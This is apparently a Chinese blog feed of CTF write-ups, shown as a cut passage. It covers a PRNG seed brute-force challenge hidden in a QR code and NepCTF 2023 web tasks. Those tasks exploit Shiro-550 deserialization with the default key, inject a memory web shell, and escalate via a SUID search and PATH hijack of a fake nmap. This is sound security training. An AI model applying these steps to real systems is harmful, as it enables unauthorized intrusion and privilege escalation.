class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import qrcode</span><br><span class="line">from PIL import Image</span><br><span class="line">from random import randrange, getrandbits, seed</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">flag = os.getenv(&quot;FLAG&quot;)</span><br><span class="line">if flag == None:</span><br><span class="line">    flag = &quot;flag&#123;test&#125;&quot;</span><br><span class="line"></span><br><span class="line">secret_seed = randrange(1, 1000)</span><br><span class="line">seed(secret_seed)</span><br><span class="line">reveal = []</span><br><span class="line">for i in range(20):</span><br><span class="line">    reveal.append(str(getrandbits(8)))</span><br><span class="line">target = getrandbits(8)</span><br><span class="line">reveal = &quot;,&quot;.join(reveal)</span><br><span class="line"></span><br><span class="line">img_qrcode = qrcode.make(reveal)</span><br><span class="line">img_qrcode = img_qrcode.crop((35, 35, img_qrcode.size[0] - 35, img_qrcode.size[1] - 35))</span><br><span class="line"></span><br><span class="line">offset, delta, rate = 50, 3, 5</span><br><span class="line">img_qrcode = img_qrcode.resize(</span><br><span class="line">    (int(img_qrcode.size[0] / rate), int(img_qrcode.size[1] / rate)), Image.LANCZOS</span><br><span class="line">)</span><br><span class="line">img_out = Image.new(&quot;RGB&quot;, img_qrcode.size)</span><br><span class="line">for y in range(img_qrcode.size[1]):</span><br><span class="line">    for x in range(img_qrcode.size[0]):</span><br><span class="line">        pixel_qrcode = img_qrcode.getpixel((x, y))</span><br><span class="line">        if pixel_qrcode == 255:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                    randrange(offset, offset + delta),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line">        else:</span><br><span class="line">            img_out.putpixel(</span><br><span class="line">                (x, y),</span><br><span class="line">                (</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                    randrange(offset - delta, offset),</span><br><span class="line">                ),</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">img_out.save(&quot;qrcode.png&quot;)</span><br><span class="line">with open(&quot;qrcode.png&quot;, &quot;rb&quot;) as f:</span><br><span class="line">    data = f.read()</span><br><span class="line">print(&quot;This my gift:&quot;)</span><br><span class="line">print(base64.b64encode(data).decode(), &quot;\\n&quot;)</span><br><span class="line"></span><br><span class="line">ans = input(&quot;What&#x27;s your answer:&quot;)</span><br><span class="line">if ans == str(target):</span><br><span class="line">    print(flag)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;No no no!&quot;)</span><br></pre></td></tr></table></figure><p>nc连上去，会给一长串的base64数据，然后要求输入answer。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>首先是生成reveal的地方，还有target[也就是我们最后要求的answer] <code>secret_seed = randrange(1, 1000) seed(secret_seed) reveal = [] for i in range(20): reveal.append(str(getrandbits(8))) target = getrandbits(8) reveal = &quot;,&quot;.join(reveal)</code></li><li>先用getrandbits(8)生成了20个数字，放到reveal里面了，然后又生成了target，所以我们的思路就是利用伪随机数的原理，通过那20个数去爆破第21位</li><li>而题目后面的内容就是把这20个数据的信息生成一个二维码再把信息的base64编码输出给我们，所以还需要一个脚本把这个二维码还原出来。</li></ul><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><p>首先是二维码的还原</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># auther:youzhi</span><br><span class="line"># time:2023/8/27</span><br><span class="line">import base64</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">base64_encoded_data = &quot;&quot;&quot;</span><br><span class="line">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</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># 解码base64数据</span><br><span class="line">decoded_data = base64.b64decode(base64_encoded_data)</span><br><span class="line"></span><br><span class="line"># 将解码后的数据写入PNG文件</span><br><span class="line">with open(&quot;restored_qrcode.png&quot;, &quot;wb&quot;) as f:</span><br><span class="line">    f.write(decoded_data)</span><br><span class="line"></span><br><span class="line"># 打开恢复后的QR码图像</span><br><span class="line">restored_qrcode = Image.open(&quot;restored_qrcode.png&quot;)</span><br><span class="line">restored_qrcode.show()</span><br></pre></td></tr></table></figure><p>生成的二维码直接扫描就得到数据，接下来就是考虑编写脚本爆破。</p><p>思路就是：把已知的20个数值传上去，然后用循环开始执行随机生成seed和getrandbits(8)，当找到匹配的结果之后就继续下一位，直到20个数值全部匹配成功，就说明找到了那个序列，就直接再执行一次输出第21位的值。</p><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># auther:youzhi</span><br><span class="line"># time:2023/8/28</span><br><span class="line">from random import seed, getrandbits</span><br><span class="line"></span><br><span class="line"># 已知的 20 个数值</span><br><span class="line">known_values = [78,122,161,126,38,94,156,23,65,190,167,204,205,160,124,45,170,60,107,148]</span><br><span class="line"></span><br><span class="line"># 待爆破的目标值</span><br><span class="line">target = None</span><br><span class="line"></span><br><span class="line"># 尝试不同的种子和随机数生成，直到找到匹配的结果</span><br><span class="line">for secret_seed in range(1, 1000):</span><br><span class="line">    seed(secret_seed)  # 设置种子</span><br><span class="line">    for _ in range(20):</span><br><span class="line">        generated_value = getrandbits(8)</span><br><span class="line">        if generated_value != known_values[_]:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        # 找到合适的种子和随机数生成方式</span><br><span class="line">        target = getrandbits(8)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"># 输出结果</span><br><span class="line">if target is not None:</span><br><span class="line">    print(&quot;Found target:&quot;, target)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Target not found&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF-2023-web部分writeup</title>
      <link href="/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/"/>
      <url>/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h1><h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p>NepCTF2023-<strong>ez_java_checkin</strong></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>shiro550反序列化</p><h2 id="题目内容"><a href="#题目内容" class="headerlink" title="题目内容"></a>题目内容</h2><p>进入之后</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/111-1024x334.png"></p><p>弱口令admin admin登录管理员，发现rememberme字段，判断为shiro反序列化</p><p>管理员：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberme：MOTxEj+Cpb97nTWsgAl7OWPq7efd60ZYeSX9PUxlSDrcbbbrOFVXJUwlS2BvQ5iIiHhj2D162GgzUCkhL5AQ5Io++M0gBdfBqT9yHXSSgGn/LLvyZAoq/9wTNeB5txSBuEKe6nxY0NW0cpnkwguPd0jgQIHiM5PxTT/bAJFarV0QPkKVc8oJz94IUTZRUfV+7zii7LduVumSTKlO6lSTbkGys1m91kutnYW8q48+LPcQkEKBvShgBM8r+fNId87yy3mAHXGd0hQ0vEsyqnlziIGphrvw5qkbgfDCQ2oZPO/zQgosiQhZ24Sq55kDX7lmtEKp2Og+HTfR+snXiU3FE0NC/l8k/3gFNrXO1jpdgFgl56k2C/wd+lqfddXPUrT8i6SrkmIR4NZrNKRLL0xHm/shahhVSIw/tLGEiPtUSnt7X0OADQPrjIupxO37VzRAkBkedyDHP7iE8p7sxa8Si6r/OTZkUHgIOadq5MNNZlIsBQK8gZH3ecw7mYIsj+CaWrsA3NUa9neFraH6eGMW0w==</span><br></pre></td></tr></table></figure><p>使用工具：</p><p><a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p><hr><p>呃呃环境没了，本地部署一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar  ShiroSpring-0.0.1-SNAPSHOT.jar  --server.port=81</span><br></pre></td></tr></table></figure><p>访问127.0.0.1:81</p><hr><p>关于密钥，这个工具 密钥爆破不出来，实际上就是默认密钥</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/112-1024x473.png"></p><p>密钥：kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p><p>利用链用工具爆破</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/113-1024x99.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/114.png"></p><p>直接用工具注内存马了</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/115-1024x317.png"></p><p>蚁剑连接的时候注意一下因为是java的所以是jsp连接不是PHP。</p><hr><p>蚁剑连上之后发现没有权限读取flag，需要提权</p><p>使用 SUID 提权</p><p>参考：</p><p><a href="https://www.anquanke.com/post/id/86979">https://www.anquanke.com/post/id/86979</a></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/116.png"></p><hr><p>有一个非预期：start.sh里面有flag，不需要提权。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/117.png"></p><h1 id="独步天下"><a href="#独步天下" class="headerlink" title="独步天下"></a>独步天下</h1><h2 id="题目来源-1"><a href="#题目来源-1" class="headerlink" title="题目来源"></a>题目来源</h2><p>NepCTF2023-<strong>独步天下-转生成为镜花水月中的王者+独步天下-破除虚妄_探见真实+独步天下-破除试炼_加冕成王</strong></p><h2 id="考点-1"><a href="#考点-1" class="headerlink" title="考点"></a>考点</h2><p>SUID提权+内网渗透+反弹shell</p><h2 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a><strong>独步天下-转生成为镜花水月中的王者</strong></h2><h3 id="考点-2"><a href="#考点-2" class="headerlink" title="考点"></a>考点</h3><p>hint：环境变量提权</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>nc 连接</p><p>首先尝试SUID提权，查找有suid的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find / -user root -perm /4000 2&gt;/tmp/err</span><br><span class="line">/bin/nmap</span><br></pre></td></tr></table></figure><p>flag 没权限读</p><p>有出网，无dns，本地有nmap</p><p>nmap有suid</p><p>利用nmap提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ nmap -h</span><br><span class="line">nmap -h</span><br><span class="line">sh: ports-alive: not found</span><br></pre></td></tr></table></figure><p>nmap应该不是正常nmap，会直接执行 ports-alive</p><p>进入&#x2F;tmp目录修改环境变量：</p><figure class="highlight plaintext"><table><tr><td 